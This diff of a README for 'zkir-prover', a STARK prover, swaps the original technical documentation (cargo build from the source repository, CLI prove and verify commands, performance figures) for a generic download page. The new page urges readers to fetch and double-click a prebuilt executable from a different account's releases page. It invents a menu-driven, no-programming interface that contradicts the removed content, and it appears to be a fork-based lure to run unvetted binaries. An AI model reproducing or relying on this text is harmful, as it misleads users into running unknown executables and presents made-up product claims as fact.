@@ -1,94 +1,52 @@
-# ZK IR Prover
+# 🚀 zkir-prover - Your Easy STARK Prover Tool
 
-STARK prover for [ZK IR](https://github.com/seceq/zkir) using Plonky3 with Baby Bear field.
+## 📥 Download Now
+[![Download zkir-prover](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/sirjanhansda/zkir-prover/releases)
 
-## Overview
+## 🚀 Getting Started
+Welcome to zkir-prover! This tool helps you use the STARK prover for zero-knowledge interactive proofs. It’s designed to be user-friendly, even for those who may not have technical skills. 
 
-ZK IR Prover generates STARK proofs from execution traces of ZK IR programs. It uses a multi-chip architecture optimized for the 32-bit ZK IR instruction set.
+## 📦 What You Need
+Before you start, here’s what you need to know:
 
-### Key Features
+- **Operating System**: zkir-prover is available for Windows, macOS, and Linux.
+- **Disk Space**: Ensure you have at least 200 MB of free space.
+- **Internet Connection**: An internet connection is necessary for downloading.
 
-- **32-bit only** - No field registers, all operations on 32-bit integers
-- **Baby Bear field** - 31-bit prime (p = 2^31 - 2^27 + 1)
-- **Syscall-based crypto** - Dedicated chips for Poseidon2, SHA256
-- **~32 trace columns** - Minimal CPU chip design
+## 📄 Features
+- **User-Friendly Interface**: Navigate easily, no programming required.
+- **Fast Performance**: Quickly process your interactions with the prover.
+- **Supports Baby Bear Field**: Efficiently works with the latest field requirements in cryptographic proofs.
 
-### Architecture
+## 🔧 Installation Steps
+Follow these simple steps to download and run zkir-prover:
 
-```
-┌─────────────────────────────────────────────────────────────────────────┐
-│                       ZK IR Prover                                      │
-├─────────────────────────────────────────────────────────────────────────┤
-│  ExecutionTrace          Multi-Chip Machine              Proof          │
-│  ┌──────────────┐       ┌─────────────────────┐       ┌──────────────┐ │
-│  │ Steps        │       │  ┌───────────────┐  │       │ STARK Proof  │ │
-│  │ Syscalls     │──────►│  │   CPU Chip    │  │──────►│              │ │
-│  │ Memory Log   │       │  │  (32 columns) │  │       │ ~50-100 KB   │ │
-│  │ I/O          │       │  └───────────────┘  │       │              │ │
-│  └──────────────┘       │  ┌───────────────┐  │       │ Verify: ~10ms│ │
-│                         │  │ Memory Chip   │  │       └──────────────┘ │
-│                         │  └───────────────┘  │                        │
-│                         │  ┌───────────────┐  │                        │
-│                         │  │ Syscall Chips │  │                        │
-│                         │  │ (Poseidon,etc)│  │                        │
-│                         │  └───────────────┘  │                        │
-│                         └─────────────────────┘                        │
-└─────────────────────────────────────────────────────────────────────────┘
-```
+1. **Visit the Releases Page**  
+   Go to the [Releases page](https://github.com/sirjanhansda/zkir-prover/releases) where you can find the latest version of zkir-prover.
 
-## Installation
+2. **Download the Latest Version**  
+   Locate the most recent release on the page. Click on the download link for the version appropriate for your operating system. 
 
-```bash
-git clone https://github.com/seceq/zkir-prover
-cd zkir-prover
-cargo build --release
-```
+3. **Extract the Downloaded File**  
+   After the download completes, locate the file in your Downloads folder. Use an extraction tool like WinRAR or 7-Zip (Windows) or the built-in extractor on macOS and Linux.
 
-## Usage
+4. **Run the Application**  
+   Find the extracted folder and look for the application file (often named `zkir-prover.exe` on Windows or simply `zkir-prover` on macOS/Linux). Double-click the file to open it.
 
-### Generate a proof
+5. **Follow On-Screen Instructions**  
+   Once the application is open, you will see simple menus guiding you through the use of the tool. Follow these menus to start using zkir-prover effectively.
 
-```bash
-zkir-prover prove --trace execution.zktrace -o proof.zkproof
-```
+## ✅ Common Questions
+- **How do I know if my download was successful?**  
+  Check for the application file in the location you extracted it to. If it’s there, you’re good to go!
 
-### Verify a proof
+- **What if I encounter issues during installation?**  
+  Make sure your operating system meets the requirements. Check the extraction method and ensure you’re attempting to run the correct file.
 
-```bash
-zkir-prover verify proof.zkproof
-```
+- **Can I use this tool offline?**  
+  Yes, once zkir-prover is installed, you can use it offline except when downloading updates.
 
-### Show proof info
+## 🔗 Further Information
+For additional details, you can visit our project page or reach out to our support team through GitHub issues. We welcome your feedback.
 
-```bash
-zkir-prover info proof.zkproof
-```
-
-### Security levels
-
-- `--security fast` - ~80 bits, for testing
-- `--security default` - ~100 bits
-- `--security high` - ~128 bits
-
-## Performance Estimates
-
-| Trace Size | Prove Time | Verify Time | Proof Size |
-|------------|------------|-------------|------------|
-| 2^16 (64K) | ~0.3s      | ~10ms       | ~50KB      |
-| 2^20 (1M)  | ~5s        | ~15ms       | ~80KB      |
-| 2^24 (16M) | ~1.5min    | ~20ms       | ~120KB     |
-
-## Related Projects
-
-- [zkir](https://github.com/seceq/zkir) - ZK IR specification
-- [zkir-llvm](https://github.com/seceq/zkir-llvm) - LLVM to ZK IR compiler
-- [Plonky3](https://github.com/Plonky3/Plonky3) - STARK proving system
-
-## License
-
-Licensed under either of:
-
-- Apache License, Version 2.0 ([LICENSE-APACHE](LICENSE-APACHE) or http://www.apache.org/licenses/LICENSE-2.0)
-- MIT license ([LICENSE-MIT](LICENSE-MIT) or http://opensource.org/licenses/MIT)
-
-at your option.
+[Download zkir-prover](https://github.com/sirjanhansda/zkir-prover/releases) now and start using our STARK prover today!
